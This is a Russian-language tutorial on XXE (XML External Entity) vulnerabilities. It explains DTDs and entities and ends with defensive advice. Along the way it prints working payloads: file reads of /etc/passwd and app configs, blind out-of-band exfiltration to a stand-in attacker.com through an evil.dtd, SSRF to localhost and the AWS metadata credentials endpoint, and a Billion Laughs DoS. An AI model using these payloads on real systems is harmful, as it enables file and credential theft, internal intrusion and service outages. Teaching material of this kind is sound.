# XXE
В этом уроке разберём уязвимость `XXE` (XML External Entity). Это классическая проблема парсеров `XML`, которая на первый взгляд кажется «какой-то мелкой настройкой», а на практике позволяет читать файлы с сервера, ходить во внутреннюю сеть и даже использовать сервер как прокси для других атак. Чтобы понять `XXE`, сначала нужно чуть разобраться, как устроен `XML`, сущности и `DTD`.

## Что такое XML
`XML` (eXtensible Markup Language) — это текстовый формат разметки, похожий по синтаксису на `HTML`, но более общий и «машинный». Он описывает данные в виде дерева:
```xml
<user>
    <name>Alex</name>
    <role>admin</role>
</user>
```
### Основные элементы:
* теги: `<user>`, `<name>`
* атрибуты: `<user id="123">`
* текстовое содержимое (между тегами).

XML активно используется в конфигурациях, интеграциях между системами, старых API, SOAP, SAML и т.д.

### XML-сущности (Entities)
В XML есть механизм сущностей — это такие `«переменные»` в тексте документа. Классический вид — встроенные сущности:
`&lt;` → `<`; `&gt;` → `>`; `&amp;` → `&`.

То есть в документе можно писать `&lt;tag&gt;`, а парсер при разборе подставит настоящий `<tag>`.

Кроме встроенных, можно объявлять пользовательские сущности, чтобы переиспользовать текстовые фрагменты или подставлять внешние данные.

### Определение типа документа (DTD)
`DTD` (Document Type Definition) — это «описание типа документа», которое говорит парсеру, какие элементы и атрибуты допустимы, а также позволяет объявлять сущности.

`DTD` может быть:
* внешним (отдельный файл, на который ссылается XML),
* внутренним (встроенный блок внутри документа).

### Пример XML с внутренним DTD:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
    <!ELEMENT data (#PCDATA)>
    <!ENTITY company "MySecureCorp">
]>
<data>&company;</data>
```
Здесь:
- объявлена сущность `company`,
- в теле документа пишем `&company;`,
- парсер подставит строку `MySecureCorp`.

Вот это:
```xml
<!DOCTYPE data [ ... ]>
```
Это инструкции для парсера. Ты говоришь:
> вот дополнительные правила, как обрабатывать `XML`

### Пользовательские сущности в XML
Пользовательские сущности бывают:
* ***внутренние*** — значение задаётся прямо в `DTD`  
`<!ENTITY name "Some Text">`
* ***внешние*** — значение берётся из внешнего ресурса (файл, URL и т.п.):
`<!ENTITY config SYSTEM "file:///etc/config">`  
`<!ENTITY remote SYSTEM "http://example.com/data.txt">`

Дальше в документе можно написать `&config;`, и парсер при разборе пойдёт по указанному `URI`, прочитает содержимое и подставит его.

***ENTITY = переменная внутри XML***

Пример:
```xml
<!ENTITY x "Hello">
```
Потом в XML можно написать:
```xml
<data>&x;</data>
```
И парсер заменит это на:
```xml
<data>Hello</data>
```

#### Простая аналогия
`ENTITY` = переменная в коде
```py
x = "Hello"
print(x)
```

Вот тут и начинается самая интересная часть для безопасности.

#### Что такое expansion (расширение)
`Expansion` = момент, когда:
```xml
&x;
```
Превращается в значение. То есть:
```xml
* было: &x;
* стало: Hello
```

#### Внешние сущности в XML
`Внешняя сущность` (External Entity) — это сущность, значение которой берётся из внешнего источника:
- локальный файл: `file:///...`;
- HTTP/HTTPS: `http://...`;
- иногда другие протоколы (в зависимости от парсера).

Если парсер настроен так, что:
* разрешает `DTD`,
* разрешает внешние сущности,
* принимает `XML` от пользователя,

то злоумышленник может подсунуть свою `DTD` с внешней сущностью и заставить сервер:
- читать файлы из файловой системы,
- ходить по внутренним адресам (внутренняя сеть, 127.0.0.1 и т.п.),
- отправлять прочитанные данные куда-то ещё.

Это и есть основа `XXE`.

### Что делает сервер
Вот эта строка:
```python
PARSER = etree.XMLParser(load_dtd=True, resolve_entities=True, no_network=False)
```
**load_dtd=True**
- разрешает DOCTYPE
- то есть разрешает “инструкции”

**resolve_entities=True**
- включает ENTITY EXPANSION:
```
&x;
```
будет заменено на значение

**no_network=False**
- разрешает сеть - http://evil.com
### Что такое lxml
`lxml` - это библиотека Python, которая:
* читает XML
* обрабатывает entities
* поддерживает XPath

## Что такое XXE (XML External Entity) - уязвимость
`XXE` (XML External Entity) — это уязвимость в XML-парсере, когда он:
* принимает XML из недоверенного источника (пользователь, внешняя система);
* разрешает использование DTD и внешних сущностей;
* автоматически загружает и расширяет эти сущности.

Злоумышленник модифицирует `XML` (и/или `DTD`) так, чтобы:
* объявить внешнюю сущность, указывающую на локальный файл или внутренний ресурс;
* использовать эту сущность в документе.

В результате парсер:
* читает содержимое файла (например, `file:///etc/passwd`) и подставляет его в дерево XML;
* либо делает запрос по `http://...` к внутренним системам (внутренние API, админки, метаданные облака и т.п.).

### Как это работает логически
Логика атаки (в общих чертах):
1. Приложение принимает `XML` (SOAP, SAML, загрузка конфигов, импорт/экспорт и т.д.).
2. XML-парсер настроен по умолчанию и разрешает внешние сущности.
3. Злоумышленник отправляет специально сформированный `XML`, в котором:
- в `DTD` объявлена внешняя сущность, ссылающаяся на интересующую цель (`file:///...` или `http://...`);
- в теле документа эта сущность где-то используется.
4. Парсер, разбирая `XML`, обращается по указанному `URI`, читает содержимое и:
* либо возвращает его в ответе (классический `XXE`),
* либо куда-то отправляет (`Blind XXE` с OOB-каналом),
* либо просто выполняет запрос к внутренней системе (`XXE → SSRF`).

С точки зрения приложения всё выглядит как «обычный разбор XML», но внутри происходят лишние действия, о которых разработчик даже не подозревает.

## Типы атак XXE
### 1. XXE: Чтение файлов
Классический сценарий:
1. внешняя сущность ссылается на локальный файл, например `file:///etc/passwd` на Unix;
2. сущность используется в месте, которое потом попадает в ответ пользователю (или в лог, который можно прочитать);
3. содержимое файла утекает через ответ приложения или другие каналы.

Так можно пытаться читать:
- конфиги приложений;
- файлы с секретами и ключами;
- системные файлы, дающие информацию о среде.

Предположим, приложение принимает `XML`:
```xml
<user>
    <name>Ivan</name>
</user>
```
Атакующий отправляет:
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
    <name>&xxe;</name>
</user>
```
#### Что происходит:
1. Парсер видит `<!ENTITY xxe SYSTEM "...">`
2. Идёт в файловую систему: `file:///etc/passwd`
3. Подставляет содержимое вместо `&xxe;`

#### Возможный ответ сервера:
```xml
<user>
    <name>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...</name>
</user>
```
В реальности это часто выглядит как:
* утечка в API-ответе
* утечка в логах
* отображение в UI

### 2. Чтение конфигов приложения
Пример: утечка конфигурации
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY cfg SYSTEM "file:///app/config.yaml">
]>
<request>
    <data>&cfg;</data>
</request>
```
Если приложение потом возвращает `<data>`, атакующий может получить:
```
db_password: supersecret
api_key: 123456
jwt_secret: very_secret_key
```
Это уже не просто инфа — это доступ к БД, API и т.д.

### 2. XXE: Blind XXE
`Blind XXE` — это когда результат чтения файла не возвращается напрямую в ответе, но сервер всё равно его прочитал. В этом случае атакующий использует `OOB` (out-of-band)-каналы:
- объявляет внешнюю сущность, которая при разборе заставляет сервер отправить запрос на контролируемый злоумышленником сервер;
- в этот запрос можно «вшить» содержимое файла (например, в путь или параметры запроса);
- злоумышленник смотрит логи у себя и восстанавливает украденные данные.

Приложение при этом может просто обработать `XML` и ничего «подозрительного» не показать в ответе, но утечка уже произошла.

#### Пример с OOB (внешний сервер атакующего, когда ответа нет)
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "http://attacker.com/log?data=file:///etc/passwd">
]>
<request>
    <info>&xxe;</info>
</request>
```
Сервер:
* делает запрос на `attacker.com`
* атакующий смотрит логи своего сервера

#### Более реалистичный Blind XXE (через DTD)
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<data>test</data>
```
А на сервере атакующего (evil.dtd):
```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;
```
Это уже уровень bug bounty / pentest.

###  3. XXE: SSRF через внешние сущности
XXE: `SSRF` — это использование внешних сущностей, чтобы заставить XML-парсер ходить по HTTP/другим протоколам к внутренним системам:
* внутренняя админка (http://admin.internal/);
* сервисы, доступные только из локальной сети;
* служебные endpoints (например, в облаке — метаданные инстанса).

#### Пример атаки на внутренний сервис
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY internal SYSTEM "http://127.0.0.1:8080/admin">
]>
<request>
    <info>&internal;</info>
</request>
```
Здесь цель — не прочитать файл, а `использовать сервер как прокси во внутреннюю сеть`, поскольку он имеет туда доступ. Так можно:
* делать запросы к внутренним API;
* сканировать порты на внутренних хостах;
* получать конфигурацию облачной инфраструктуры и токены.

### 4. SSRF в облаке
Это прям классика AppSec.  
Пример: `AWS metadata`
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY meta SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<request>
    <creds>&meta;</creds>
</request>
```
#### Результат:
сервер возвращает `IAM-токены`:
```
{
  "AccessKeyId": "...",
  "SecretAccessKey": "...",
  "Token": "..."
}
```
После этого:
* атакующий получает доступ к `AWS`
* может читать `S3`, запускать инстансы и т.д.

### 5. DoS через “Billion Laughs”
Пример атаки:
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>
```
Что происходит:
* сущности рекурсивно расширяются
* память улетает в космос
* сервер падает

## Другие последствия XXE
Хотя в вопросе это не требовалось, важно знать, что `XXE` может использоваться и для:
- `DoS-атак на парсер` (типа «billion laughs» — взрывное расширение сущностей);
- раскрытия структуры системы (пути к файлам, версии библиотек, наличие тех или иных сервисов).

По сути `XXE` превращает XML-парсер в инструмент для взаимодействия с внешним миром (файловая система, сеть), управляемый атакующим через XML.

## Защита от XXE
***Главный принцип:*** не позволять парсеру XML автоматически загружать и обрабатывать внешние сущности и `DTD` из недоверенного входа.
1. `Отключение DTD` и внешних сущностей
2. Включать в XML-парсере режимы `«secure»`/`«safe»`/`«no external entities»` (названия отличаются в разных библиотеках).
3. Явно `запрещать обработку внешних сущностей` и загрузку DTD там, где это не нужно.
4. Если приложение не использует `DTD` и пользовательские сущности по функционалу, их лучше `полностью отключить`.

Идеально, если парсер:
* не загружает `SYSTEM/PUBLIC` сущности;
* игнорирует внешнее `DTD`;
* не разрешает любой произвольный `URI` внутри `XML`.

5. Ограничение формата входного `XML`:
* при проектировании протокола стараться не полагаться на `DTD` и пользовательские сущности;
* если `XML` используется только как «контейнер данных», не давать возможность подсовывать свои DTD-объявления;
* использовать более простые форматы (JSON и т.п.) там, где это возможно — не потому что JSON «магически безопасен», а потому что в нём нет `DTD` и сущностей.

6. Ограничение сетевого доступа:
Даже при ошибках в парсере можно снизить ущерб:
* ограничить исходящие соединения с сервера: не давать приложению свободно ходить в интернет и во всю внутреннюю сеть;
* отделить критичные внутренние сервисы от узлов, которые принимают `XML` из внешнего мира;
* использовать `firewall` / `ACL`, чтобы даже при `XXE-SSRF` атакующий не мог достучаться до самых чувствительных ресурсов.

7. Валидация и анализ
* Проверять `XML` перед разбором: отклонять документы с неожиданным `DTD`, сущностями и «подозрительными» конструкциями (если протокол изначально их не предполагает).
* Использовать статический и динамический анализ (SAST/DAST), чтобы вовремя находить места, где XML-парсер работает в небезопасном режиме.
* В логах обращать внимание на ошибки парсинга XML с `DTD` и странные обращения к `URI`, появляющиеся при разборе.

## Итог
`XXE` — это не «фича XML», а уязвимость конфигурации `XML-парсера`: когда он доверяет внешним сущностям и `DTD`, приходящим от пользователя. Через внешние сущности можно читать локальные файлы, вызывать внутренние HTTP-запросы (`SSRF`) и отправлять данные на сервера злоумышленника (`Blind XXE`). `Основная защита` — выключать поддержку внешних сущностей и `DTD` там, где они не нужны, ограничивать сетевой доступ сервера и продумывать протоколы так, чтобы `XML` не превращался в управляемый атакующим «удалённый файловый/сетевой клиент».
